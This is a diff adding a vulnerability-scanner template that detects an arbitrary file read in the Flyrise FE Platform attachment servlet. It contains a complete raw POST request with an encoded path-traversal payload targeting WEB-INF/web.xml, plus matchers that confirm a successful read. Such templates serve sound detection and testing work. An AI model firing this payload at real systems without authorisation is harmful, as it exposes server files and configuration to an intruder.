@@ -1,0 +1,35 @@
+id: flyrise-attachment-arbitrary-file-read
+info:
+  name: Flyrise FE Platform Attachment Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Detects an arbitrary file read vulnerability in the Flyrise FE Platform attachment functionality.
+http:
+  - raw:
+      - |
+        POST /servlet/webchat/attachment/1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        mailAttachment=1&attachPK=%2Fv8AMQAJAC8ACQAvAAkALwAJAC8ALgAuAC8ALgAuAC8ALgAuAC8AagBiAG8AcwBzAC8AdwBlAGIALwBmAGUALgB3AGEAcgAvAFcARQBCAC0ASQBOAEYALwB3AGUAYgAuAHgAbQBs
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "</web-app>"
+          - "<filter>"
+          - "xml"
+      - type: word
+        part: header
+        words:
+          - "attachment;filename="
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
